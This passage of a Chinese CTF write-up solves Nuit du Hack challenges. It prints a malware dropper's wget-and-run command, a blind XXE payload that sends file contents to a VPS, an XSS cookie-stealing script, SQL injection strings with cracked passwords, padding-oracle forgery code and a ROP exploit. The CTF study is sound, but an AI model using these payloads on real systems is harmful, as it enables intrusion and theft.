0x90)                print hex(ea)                return GetOperandValue(ea, 0)        ea += 1    return Noneea = 0x400ccf#ea = 0x40bc52ea = 0x000000000040089Dwhile True:    ea = find_header(ea)    if ea is None:        break    print hex(ea)    ea = xor_dec(ea, 1)    if ea is None:        break    print hex(ea)print 'finished'在解压出来的代码中，共176次比较，均需要满足。import osf = open('./and_data.txt', 'r')and_values = []for line in f:    line = line.strip()    if line:        value = int(line.split(',')[1].strip('h'), 16)        and_values.append(value)f.close()print len(and_values)f = open('./cmp_data.txt', 'r')cmp_values = []for line in f:    line = line.strip()    if line:        value = int(line.split(',')[1].strip('h'), 16)        cmp_values.append(value)f.close()print len(cmp_values)def brute(c, andv):    v5 = 0xffffffff    for i in range(2):        v5 ^= ord(c[i])        for j in range(8):            if v5&amp;1:                v5 = (v5&gt;&gt;1)^(0xffffffff&amp;andv)            else:                v5 = (v5&gt;&gt;1)^(0&amp;andv)    return v5def test(andv, cmpv):    for c1 in range(0x100):        for c2 in range(0x100):            c = chr(c1) + chr(c2)            ret = brute(c, andv)            #print hex(ret)            if ret + cmpv == 0xffffffff:                return c    return Noneinput = ''for i in range(167):    c = test(and_values[i], cmp_values[i])    input += cf = open('./step4.input', 'wb')f.write(input)f.close()Codetalkers首先是一个gif，给了很多简单的图案，有重复的，根据题目的意思和第一张和最后一张进行猜测，猜测为利用图案进行单表替换的加密，类似于福尔摩斯的跳舞的小人。密码学部分简单，那么下面最关键的问题是图片处理了。我们需要对图片进行处理，首先将gif切分：去掉开始和最后的文字图片，一共将一个gif图片切分为了1245个bmp文件。可以看到在这些图片中有很多图案的形状是重复的，但是颜色和大小都不是重复的，我试了一下直接对这些图片进行相似识别，现有的py很难分得很好，所以我决定对图片进行进一步处理。接下来，我们去掉颜色，将图片转为纯粹的黑白二色图片，连灰度都不要：def padlen(a):    return ""0""*(5-len(str(a)))+str(a)from PIL import Imagedef RGB2BlackWhite(filename,savename):    im = Image.open(filename)    print ""image info,"", im.format, im.mode, im.size    (w, h) = im.size    R = 0    G = 0    B = 0    for x in xrange(w):        for y in xrange(h):            pos = (x, y)            rgb = im.getpixel(pos)            (r, g, b) = rgb            R = R + r            G = G + g            B = B + b    rate1 = R * 1000 / (R + G + B)    rate2 = G * 1000 / (R + G + B)    rate3 = B * 1000 / (R + G + B)    print ""rate:"", rate1, rate2, rate3    for x in xrange(w):        for y in xrange(h):            pos = (x, y)            rgb = im.getpixel(pos)            (r, g, b) = rgb            n = r * rate1 / 1000 + g * rate2 / 1000 + b * rate3 / 1000            # print ""n:"",n            if n &gt;= 10:                im.putpixel(pos, (255, 255, 255))            else:                im.putpixel(pos, (0, 0, 0))    im.save(savename)for i in range(1,1246):    im=""codetalkers.gif.ifl/IMG""+padlen(i)+"".bmp""    imsave='bw/'+str(i)+"".bmp""    RGB2BlackWhite(im,imsave)经过这个脚本转换后，我将图片转为了纯粹的黑白图片：这里要注意rgb的阈值的选取，可以边测试边调整，发现如果图片全黑那么说明选取的值偏大，可以进行调节，保证有白色的图案出来。这样转换完成后，还是有问题，就是图案的大小和顺序是不一样的，所以我又找了个图片裁剪的函数，将周围的黑边去掉，并把裁剪完的图片调节为固定大小：import Image, ImageChopsdef autoCrop(image,backgroundColor=None):    '''Intelligent automatic image cropping.       This functions removes the usless ""white"" space around an image.       If the image has an alpha (tranparency) channel, it will be used       to choose what to crop.       Otherwise, this function will try to find the most popular color       on the edges of the image and consider this color ""whitespace"".       (You can override this color with the backgroundColor parameter)       Input:            image (a PIL Image object): The image to crop.            backgroundColor (3 integers tuple): eg. (0,0,255)                 The color to consider ""background to crop"".                 If the image is transparent, this parameters will be ignored.                 If the image is not transparent and this parameter is not                 provided, it will be automatically calculated.       Output:            a PIL Image object : The cropped image.    '''    def mostPopularEdgeColor(image):        ''' Compute who's the most popular color on the edges of an image.            (left,right,top,bottom)            Input:                image: a PIL Image object            Ouput:                The most popular color (A tuple of integers (R,G,B))        '''        im = image        if im.mode != 'RGB':            im = image.convert(""RGB"")        # Get pixels from the edges of the image:        width,height = im.size        left   = im.crop((0,1,1,height-1))        right  = im.crop((width-1,1,width,height-1))        top    = im.crop((0,0,width,1))        bottom = im.crop((0,height-1,width,height))        pixels = left.tobytes() + right.tobytes() + top.tobytes() + bottom.tobytes()        # Compute who's the most popular RGB triplet        counts = {}        for i in range(0,len(pixels),3):            RGB = pixels[i]+pixels[i+1]+pixels[i+2]            if RGB in counts:                counts[RGB] += 1            else:                counts[RGB] = 1        # Get the colour which is the most popular:        mostPopularColor = sorted([(count,rgba) for (rgba,count) in counts.items()],reverse=True)[0][1]        return ord(mostPopularColor[0]),ord(mostPopularColor[1]),ord(mostPopularColor[2])    bbox = None    # If the image has an alpha (tranparency) layer, we use it to crop the image.    # Otherwise, we look at the pixels around the image (top, left, bottom and right)    # and use the most used color as the color to crop.    # --- For transparent images -----------------------------------------------    if 'A' in image.getbands(): # If the image has a transparency layer, use it.        # This works for all modes which have transparency layer        bbox = image.split()[list(image.getbands()).index('A')].getbbox()    # --- For non-transparent images -------------------------------------------    elif image.mode=='RGB':        if not backgroundColor:            backgroundColor = mostPopularEdgeColor(image)        # Crop a non-transparent image.        # .getbbox() always crops the black color.        # So we need to substract the ""background"" color from our image.        bg = Image.new(""RGB"", image.size, backgroundColor)        diff = ImageChops.difference(image, bg)  # Substract background color from image        bbox = diff.getbbox()  # Try to find the real bounding box of the image.    else:        raise NotImplementedError, ""Sorry, this function is not implemented yet for images in mode '%s'."" % image.mode    if bbox:        image = image.crop(bbox)    return imagefor i in range(1,1246):    im = Image.open('bw/'+str(i)+'.bmp')    cropped = autoCrop(im)    cropped=cropped.resize((80, 80), Image.ANTIALIAS)    cropped.save('min/'+str(i)+'.bmp')调节过后达到了如下效果：这样处理过后，再进行图案的比对分析，网上的脚本基本均可使用，相同图片和不同图片的差异在30倍以上。最后我将相同的图案用一种字母代替，得到了图片到字符串的转换结果，发现一共有26种不同图案，正好对应26个字母。from itertools import izipimport Imagedef padlen(a):    return ""0""*(5-len(str(a)))+str(a)def check(num1,num2):    i1 = Image.open(""min/""+str(num1)+"".bmp"")    i2 = Image.open(""min/""+str(num2)+"".bmp"")    assert i1.mode == i2.mode, ""Different kinds of images.""    assert i1.size == i2.size, ""Different sizes.""    pairs = izip(i1.getdata(), i2.getdata())    if len(i1.getbands()) == 1:        dif = sum(abs(p1 - p2) for p1, p2 in pairs)    else:        dif = sum(abs(c1 - c2) for p1, p2 in pairs for c1, c2 in zip(p1, p2))    ncomponents = i1.size[0] * i1.size[1] * 3    return (dif / 255.0 * 100) / ncomponentsimport stringcharlist=string.printablecharlist=""abcdefghijklmnopqrstuvwxyz""misc=['0']*1246p=0for i in range(1,1246):    print i    if misc[i]=='0':        misc[i]=charlist[p]        for j in range(i+1,1246):            te=check(i,j)            if misc[j]=='0' and te&lt;15:                misc[j]=charlist[p]            if te&gt;10 and te&lt;15:                print i,j                print ""sth error""                raw_input()        p += 1print """".join(misc)这样转换完成后，我们可以对得到的字符串在quipquip上破解单表替代密码：最后的空格去掉就是flag。From Russia with Love分析dump.img中的程序，发现将第2扇区开始的几个扇区读入到0x1000处，然后跳转到0x1200执行。最后发现会向shell脚本中插入一些字符，插入的代码如下。同时通过ultraiso可以从dump.img中提取得到一个picture.bmp文件。f = open('./dump2.img', 'rb')d = f.read()[0x7e7:].split('\x00')[0]f.close()s = ''for i in range(len(d)):    s += chr(ord(d[i])^0x90)print s得到的字符串为:wget http://fromrussiawithlove.quals.nuitduhack.com/yzaegrdsfhvzey.txt -O /tmp/b 2&gt; /dev/null &gt; /dev/null; cat /tmp/b | base64 -d &gt; /tmp/a 2&gt; /dev/null; chmod +x /tmp/a 2&gt; /dev/null; /tmp/a &amp;下载得到的/tmp/a为一个elf，将一个lib文件写入了一个/lib/lib_preload。f = open('./a.bin', 'rb')d = f.read()[0x3ec0:0x3ec0+0xa518]f.close()key = 'NDH2017'd2 = ''for i in range(0xa518):    d2 += chr(ord(d[i])^ord(key[i%7]))print d2f = open('ldpreload', 'wb')f.write(d2)f.close()分析ld_preload库文件，发现chmod中存在一定条件下会调用chiffreFiles函数。在chiffreFiles中会对文件进行加密。密钥由17个字节计算crc32得到的64个字节key。文件加密过程为生成65字节IV，然后再进行异或。写入到文件中的数据为IV+l64(length)+enc_buff由于密钥是由两个字符crc32得到的，同时bmp的头部有部分内容是固定的。因此可以根据bmp中固定的部分，得到可能的key值，然后判断key值是否为两个字符的crc32。一个bmp的头部大致如下:最后这样能算出36位key，将key通过补\x00补到64位，解密picture.bmp文件，发现文件中有大块的0xff值，如下图所示。因此根据这些非0xff值可以得到完整的key。from zio import *def crc32(c):    v5 = 0xffffffff    for i in range(2):        v5 ^= ord(c[i])        for j in range(8):            if v5&amp;1:                v5 = (v5&gt;&gt;1)^(0xffffffff&amp;0xEDB88320)            else:                v5 = (v5&gt;&gt;1)^(0&amp;0xEDB88320)    v5 = 0xffffffff -v5    return v5crc32_table = {}for c0 in range(0x80):    for c1 in range(0x80):        s = chr(c0) + chr(c1)        crc32_table[crc32(s)] = sbmp_header ='''42 4D 7A 53 07 00 00 00 00 00 ?? 00 00 00 ?? 0000 00 ?? ?? 00 00 ?? ?? 00 00 01 00 ?? 00 00 0000 00 00 ??'''bmp_header = bmp_header.replace('\n', '').replace(' ', '')print bmp_headerf = open('./dump2.img', 'rb')d = f.read()[0x7e7:].split('\x00')[0]f.close()f = open('./picture.bmp', 'rb')d = f.read()f.close()IV = d[0:0x41]length = l64(d[0x41:0x49])def find_tmp_key(tmp_key):    for key,value in crc32_table.items():        find = True        for i in range(4):            if tmp_key.has_key(i):                if tmp_key[i] != (l32(key)[i]):                    find = False                    break        if find:            return key, value    return None, Nonedata = d[0x49:]input = ''key = ''for i in range(len(bmp_header)/8):    data = bmp_header[8*i:8*i+8]    tmp_key = {}    for j in range(4):        v = data[j*2:j*2+2]        try:            c = int(v, 16)            tmp_key[j] = chr(ord(d[0x49+i*4+j])^c^ord(IV[(4*i+j)%41]))        except:            pass    k, s = find_tmp_key(tmp_key)    if input:        input += s[1:]    else:        input = s    key += l32(k)def decrypt_bmp(d, key):    IV = d[:0x41]    d3 = ''    for i in range(length):        d3 += chr(ord(d[i + 0x49]) ^ ord(IV[i % 0x41]) ^ ord(key[i % 0x40]))    f = open('a4.bmp', 'wb')    f.write(d3)    f.close()dds = '5E 9F BD F2 CA 53 44 24 C4 54 8B 5B 0D D6 97 A71D 8C 09 4A 09 B6 31 EA 6E 5D C0 B8'.replace(' ', '').decode('hex')for ds in dds:    key += chr(0xff^ord(ds))#key = key.ljust(0x40, '\x00')decrypt_bmp(d, key)flag = ''for i in range(len(key)/4):    if flag:        flag += crc32_table[l32(key[i*4:i*4+4])][1:]    else:        flag = crc32_table[l32(key[i*4:i*4+4])]print flagNo Pain No Gain进去发现是一个上传页面，上传csv，进行转换，fuzz时候得到过这样的错误所以猜测是xxe,  然后尝试一波之后没有想法,一直都报错,后来才知道,报错是没关系的,因为已经执行了,所以是一个 blind xxe   然后直接用里面的payload改一该就好了,提交的文件内容如下:&lt;!DOCTYPE ANY [&lt;!ENTITY % file SYSTEM ""php://filter/read=convert.base64-encode/resource=file:///etc/hosts""&gt;&lt;!ENTITY % xxe SYSTEM ""http://104.160.43.154:8000/evil.dtd""&gt; %xxe;%send; ]&gt;&lt;!-- Invitations --&gt;id,name,email然后vps上的evil.dtd内容如下：&lt;!ENTITY % all""&lt;!ENTITY &amp;#x25; send SYSTEM 'http://104.160.43.154:8000/xss/?file=%file;'&gt;""&gt;%all;成功获取到hosts的内容,那么开始寻找 flag ,最后是在 /home/flag/flag 里面,  最后截图如下:Slumdog Millionaire从题目获取代码如下：#!/usr/bin/python2.7import randomimport configimport utilsrandom.seed(utils.get_pid())ngames = 0def generate_combination():    numbers = """"    for _ in range(10):        rand_num = random.randint(0, 99)        if rand_num &lt; 10:            numbers += ""0""        numbers += str(rand_num)        if _ != 9:            numbers += ""-""    return numbersdef reset_jackpot():    random.seed(utils.get_pid())    utils.set_jackpot(0)    ngames = 0def draw(user_guess):    ngames += 1    if ngames &gt; config.MAX_TRIES:        reset_jackpot()    winning_combination = generate_combination()    if winning_combination == user_guess:        utils.win()        reset_jackpot()查看之后发现,要是我们知道了 seed 即那个进程的pid,那么就能预测所有的组合,所以先在网页随便输入一串东西,然后得到第一次的正确答案,这里我得到的是 56-08-50-98-94-51-01-75-63-61   然后运行如下代码就好了import randomdef generate_combination():    numbers = """"    for _ in range(10):        rand_num = random.randint(0, 99)        if rand_num &lt; 10:            numbers += ""0""        numbers += str(rand_num)        if _ != 9:            numbers += ""-""    return numbersseed=0for i in xrange(1,10000):    random.seed(i)    ret = generate_combination()    print ret    if (ret == '56-08-50-98-94-51-01-75-63-61'):        print 'find',i        seed=i        breakrandom.seed(seed)ans=generate_combination()ans=generate_combination()print ans得到ans提交就拿到flag了 Divide and rule首先点进去是个登陆页面，然后去 search 那儿找东西  发现那一堆查询参数是存在注入的,随便加个单引号就不返回值了。  然后尝试联合查询发现还是不返回,后来想到这么多参数很可能是长度受了限制,然后就分开来,最后测试成功,如下:firstname='union select/*&amp;lastname=*/1,2,3,4,5,6#&amp;position=&amp;country=123&amp;gender=但是有一个问题就是,长度限制后来测出来好像是15,这样子没办法查表名和列名之类的,因为 information_schema 太长了。  后来脑洞了一下猜到表名是 users ,  然后根据初始登录页面的name猜到字段名分别是 login 和 passwordfirstname='union select/*&amp;lastname=*/login/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=firstname='union select/*&amp;lastname=*/password/*&amp;position=*/,2,3,4,5,6 /*#&amp;country=*/from users#123&amp;gender=得到三个用户名和三个md5的密码值,MD5解密之后登陆就拿到flag了#三个用户名ruleradminpatrickraoul#三个密码04fc95a5debc7474a84fad9c50a1035d #smart1985db6eab0550da4b056d1a33ba2e8ced66 #1badgurl7ac89e3c1f1a71ee19374d7e8912714b #1badboyPurple Posse Market进去之后研究半天,发现有一个contact页面可以提交一些东西,然后其他好像也没有太多用,题目描述让拿到管理员的IBAN账户。那多半是xss拿到cookie登陆后台了,然后在评论这里尝试提交,发现根本没有过滤,下面代码直接就能返回。&lt;script src=""http://你的xss平台""&gt;&lt;/script&gt;回到题目，既然没有过滤，那么直接执行js就好了，提交如下：&lt;script src=""http://你的网址/requests.js""&gt;&lt;/script&gt;然后这个 request.js 这样写的$.get(""http://你的xss平台?a=""+document.cookie,function(data,status){})截图如下:登陆进去就能看到IBAN账户,这就是flag了。WhyUNoKnock一道挺有意思的题目，网址进去是一个登陆页面，登陆时候输入了3个参数，login password group，前两个参数用户名和密码简单测试应该没问题，然后第三个参数，更改为其他字符就提示 PDOException : 1044 一开始猜测是表名注入，但是测试各种payload发现不符合sql语句的规范。后来本地测试的时候发现输入点可能在利用pdo连接数据库的时候选择的配置。然后猜测能够覆盖掉pdo的其他配置，输入group=users;host=test.dns.log:1234;然后有dns的记录和tcp请求的记录，证明输入点的确在这个位置。但是我们不知道数据库密码和数据库结构怎么办呢？心里有两个选项: 1.虽然他想连接一个mysql服务，但是我们不一定要给他一个真的mysql，可以自己写一个fake mysql server或者在真正mysql返回的时候抓包替换返回值为自己构造的数据。2.修改mysql的配置解决这两个问题:先是利用参数skip-grant-table可以跳过认证，然后设置mysql日志抓取sql记录，然后通过sql去建立相应的数据库。这里选择了第二个方式。最后的sql日志如图erpay即为服务器连接时的用户名，然后执行了一个select语句，通过构造出相应的admins数据库，增加一条记录，就能成功登陆，拿到flag。MarkIsFaillingDownDrunk进去之后随便点一个，发现链接变成这个http://markisfaillingdowndrunk.quals.nuitduhack.com/view/deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02 这一看都不用想，80%是`padding oracle`，然后开始写代码，先把他的几串东西的明文搞出来，代码如下：import requestsimport base64import timeurl='http://markisfaillingdowndrunk.quals.nuitduhack.com/view/'N=16phpsession=""""ID=""""def inject(param):    result=requests.get(url+param)    #print result.content    return resultdef xor(a, b):    print ""length"",len(a),len(b)    return """".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])def pad(string,N):    l=len(string)    if l!=N:        return string+chr(N-l)*(N-l)def padding_oracle(N,cipher): ##return middle    get=""""    for i in xrange(1,N+1):        for j in xrange(0,256):            padding=xor(get,chr(i)*(i-1))            c=chr(0)*(16-i)+chr(j)+padding+cipher            print c.encode('hex')            result=inject(c.encode('hex'))            if result.status_code!=500:                print j                get=chr(j^i)+get                break    return gets=[""deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba"",""deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30"",""deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65"",""deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02""]IV=s[0][:16]#str4ans=[]for i in xrange(4):    c=[]    str1=s[i].decode('hex')    #print s[i]    #print str1    for j in xrange(0,len(str1),N):        c.append(str1[j:j+N])    l=len(c)    print l    p=[""""]*l    for j in xrange(l-1,0,-1):        middle=padding_oracle(N,c[j])        print ""========================middle================================""        print j        print middle.encode('hex')        p[j]=xor(middle,c[j-1])        print p[j]    print ""==========================plain===============================""    print i    print p    ans.append(p)print ans由于服务器比较慢，所以我是开了两个程序顺序反序一起跑，把第一串和第四串跑出来是个这样的东西，1：https://gist.githubusercontent.com/MarkIsFaillingDownDrunk/b9ed0141c97ae6488379dafa088c04d2/raw/4129795e82bb978e78b00bcb9b9fc4b6acb44898/test.md\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x104：https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02访问一下，内容是这个# Welcome to MarkParser !## This is a simple Markdown test.Test for dynamic rendering :[{{ config['WEBSITE_NAME'] }}](/)再看看它网页的内容这样就明白了,  也就是说他的 view 后面直接跟的链接。他会读取链接的内容,然后进行 markdown 转换,然后在进行模板渲染。  所以接下来的思路也就很明确很简单了,让它访问我们的网站预先放好的 md ,然后就是个 ssti 了,通过一些奇怪姿势找到执行命令或是读取文件的函数就行了。  这里由于有了第四个链接,所以构造一个目录如下:第四个密文对应明文: https://raw.githubusercontent.com/dlitz/pycrypto/master/README\x02\x02我的网页: http://xxx.xxx.xx.xxx:8000/xxxxxxxxxxxxxxxxxxxxx/master/README\x02\x02最后一组明文和他密文解密出来的一样,这样我就可以维持最后一个分组密文以及倒数第二个分组的密文不变了。然后依次通过 padding oracle 获取中间值,与构造的密文异或得到构造的密文,从而得到我的网址对应的密文  至于具体 padding oracle 伪造明文的原理这里不赘述了。  代码如下:import requestsimport base64import timeurl='http://markisfaillingdowndrunk.quals.nuitduhack.com/view/'N=16phpsession=""""ID=""""def inject(param):    result=requests.get(url+param)    #print result.content    return resultdef xor(a, b):    print ""length"",len(a),len(b)    return """".join([chr(ord(a[i])^ord(b[i%len(b)])) for i in xrange(len(a))])def pad(string,N):    l=len(string)    if l!=N:        return string+chr(N-l)*(N-l)def padding_oracle(N,cipher): ##return middle    get=""""    for i in xrange(1,N+1):        for j in xrange(0,256):            padding=xor(get,chr(i)*(i-1))            c=chr(0)*(16-i)+chr(j)+padding+cipher            print c.encode('hex')            result=inject(c.encode('hex'))            if result.status_code!=500:                print j                get=chr(j^i)+get                break    return get'''s=[""deadbeefcafedeadbeefcafe04030201b2c7da6ca163321fc0e96e98df20b58389e055de04be2972edc654d2f609d9608bc083bf5f35eba62d7faf73d7ec7fec88743a46bbd5711e9f954f7f54c211a3ef30067df218e84a474ec00dc1789b3c053fd578c86f6e87e080a63c6191289cd4f2e5178882f36097ae40214323b2bde2491de75c6603a708b61f80efc07b2da2d626137891b74c7019b040db51f468a2d6978e726e5c35ad9ce7f1dbc06cba"",""deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf441aee00f376a598270a8d830ddf58ab489e053dbbfba4b30652f718567777364a07d5b453fb6ab946cc6ce6485f6250d583fbaac9fb0d169de6184a1c1fa0a30"",""deadbeefcafedeadbeefcafe0403020131fdd089e91025df9510efa46b2085aac738ae5e03daa6495e2e4ee83283282a5be01dd6d817df2c0e69cd613c7da160a6aab9f02d175ac549feb6b674fa6f65"",""deadbeefcafedeadbeefcafe0403020152208110d1a06ce628ff8e10f4cbc1aa96ac276f57b6d80e50df1050c455fdf440d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02""]IV=s[0][:16]#str4ans=[]for i in xrange(4):    c=[]    str1=s[i].decode('hex')    #print s[i]    #print str1    for j in xrange(0,len(str1),N):        c.append(str1[j:j+N])    l=len(c)    print l    p=[""""]*l    for j in xrange(l-1,0,-1):        middle=padding_oracle(N,c[j])        print ""========================middle================================""        print j        print middle.encode('hex')        p[j]=xor(middle,c[j-1])        print p[j]    print ""==========================plain===============================""    print i    print p    ans.append(p)print ans'''cipher=[        ""deadbeefcafedeadbeefcafe04030201"",        ""52208110d1a06ce628ff8e10f4cbc1aa"",        ""96ac276f57b6d80e50df1050c455fdf4"",        ""40d56ae51399ceb30b5b69153ddc2302"",        ""19e3f662023665e8885c90867b8c3a02""        ]middle=[        'b6d9ca9fb9c4f182cc8ebdd0636a7669',        '2742f463b4d20f89468beb7e80e5a2c5',        'fb8343033ec2a22120a67322bd25899b',        '6fb80b9667fcbc9c591e285170992100'        ]ans   =[        ""http://xxx.xxx.x"",        ""x.xxx:8000/xxxxx"",        ""xxxxxxxxxxxxxxxx"",        ""/master/README\x02\x02""       ]tmp_ans=[""""]*5tmp_ans[4]=cipher[4]tmp_ans[3]=cipher[3]tmp_middle=middle[2].decode('hex')tmp_ans[2]=xor(ans[2],tmp_middle).encode(""hex"")tmp_middle=padding_oracle(N,tmp_ans[2].decode(""hex""))print tmp_middle.encode('hex')   #""9d41e1434f05be3bea284b8d2eb8928b"".decode('hex')tmp_ans[1]=xor(ans[1],tmp_middle).encode(""hex"")tmp_middle=padding_oracle(N,tmp_ans[1].decode(""hex""))print tmp_middle.encode('hex')   #""c05b49fef1d14b17aa0dd98a591ea57f"".decode('hex')tmp_ans[0]=xor(ans[0],tmp_middle).encode(""hex"")view="""".join(i for i in tmp_ans)print view#a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02通过上述代码,我得到我的这个链接 http://xxx.xxx.xx.xxx:8000/xxxxxxxxxxxxxxxxxxxxx/master/README 对应的密文是a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02然后修改我的网站的README的内容为 注意下我的这个内容外面包了两个反撇号，因为我们刚才说了，他会读取链接的内容，然后进行markdown转换，然后在进行模板渲染。markdown，转换在先，很多我们需要用的符号在markdown里面都有特殊语义会被转换，加上这两个反撇号就好了。 然后尝试访问http://markisfaillingdowndrunk.quals.nuitduhack.com/view/a82f3d8ecbfe64269a39f7bb6f2e8b4bae6fd0767b3f860bda1864f556c0eaf383fb3b7b46bada5958de0b5ac55df1e340d56ae51399ceb30b5b69153ddc230219e3f662023665e8885c90867b8c3a02 结果如下： 成功了,  好的,接下来就找出 SSTI 的payload执行一波命令,发现失败了,经过一番测试才知道题目用的环境是 python3 ,而平时做的题目之类的都是 python2 ,那么开始在python3下面寻找姿势。  最后 payload 如下:直接访问得到flag如下:escapeTheMatrix题目是个矩阵求逆的过程，如下：初始化的时候，矩阵行和列最大可为16*16，如下：但是逆矩阵的存储最大只有15*15，因此可以溢出，矩阵里面存储的是double类型的数据，如下所示：计算时会损失精度，数值不好控制，但是如果数量级一样的话，尾数部分占了52bit，是相对比较精确的，为了提高精度，将参与的数值计算的数取得越少越好，及将矩阵里面存储的数值绝大部分设为0，要求逆矩阵，那么最好是从单位矩阵开始修改，如下：arrays = [1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0, 0,0,0,0,0,a,b,c,d,e, f, g, h,i,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]如果该矩阵是存储的结果即逆矩阵，那么此时从a开始的位置，会在函数返回时当成rip，矩阵求逆的过程是可逆的，因此，为了求得固定的逆矩阵，可以将结果当成输入，即把a~i处的值替换成目的结果，求出最原始的的值，由于输入前也不好控制，因此在这里，直接写个gdb脚本来设置如下： target_name = ""escapeTheMatrix_patch""gdb.execute('file %s'%target_name)proc_pid = execute_external_output(""pidof %s""%target_name)[0].split(' ')[0]gdb.execute(""attach %s""%proc_pid)gdb.execute(""b *0x401018"")gdb.execute(""c"")val_list = [0x401c33, 0x400a60, 0x401c31, 0x603020,0x400D75]for i in range(len(val_list)):gdb.execute(""set *(long long*)($rsi+0x20+0x10*14*8+(5+%d)*8)=0x%x""%(i, val_list[i]))gdb.execute(""b *0x4010F2"")gdb.execute(""c"")将最终的结果，求出来以后，转换得到高精度的值，即求得小数点后面位数越多越好，如下：#include &lt;stdio.h&gt;int main(){while (1){long long val;printf(""&gt;&gt; "");scanf(""%llx"", &amp;val);printf(""%.32e\n"", *(double *)&amp;val);}}这样求出的结果直接转换成输入即可，最终利用代码如下：from zio import *is_local = Trueis_local = Falsebinary_path = ""./escapeTheMatrix_patch""libc_file_path = """"#libc_file_path = ""./libc.so.6""ip = ""escapethematrix.quals.nuitduhack.com""port = 50505if is_local:target = binary_pathelse:target = (ip, port)def get_io(target):r_m = COLORED(RAW, ""green"")w_m = COLORED(RAW, ""blue"")#io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m)io = zio(target, timeout = 9999, print_read = r_m, print_write = w_m, env={""LD_PRELOAD"":libc_file_path})return iodef pwn_with_array(io, val_list):arrays = [1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0, #1,2,3,0xcd,0xee,0xff,0x5,6,7,8,9,2,2,2,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1]for i in range(len(val_list)):arrays[14 * 16 + 5 + i] = val_list[i]io.read_until("" : "")io.writeline(str(16))io.read_until("" : "")io.writeline(str(16))io.read_until("" :"")payload = """"for item in arrays:payload += str(item) + "",""io.writeline(payload[:-1])io.read_until(""This is your result"")io.read_until(""0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,\n\n"")return def pwn(io):#offset infoif is_local:#localoffset_puts                = 0x6f690offset_system = 0x45390else:#remoteoffset_system = 0x45800offset_puts                = 0x70a90p_rdi_ret_val = -2.07582817451185170402836984431807e-317puts_got_val = -3.11447916067854977526319411883167e-317puts_plt_val = -2.07357375296987809604729216091621e-317#puts_got -8puts_got_8_val = -3.11447520815338304529084070628132e-317main_addr_val = -2.07424074159176377888193052878658e-317show_info_val = -2.07415428010374156073669962924783e-317get_buff_val = -2.07396357076444683957064747369378e-317val_list = []val_list.append(p_rdi_ret_val)val_list.append(puts_got_val)val_list.append(puts_plt_val)val_list.append(main_addr_val)""""""p_rdi_ret = 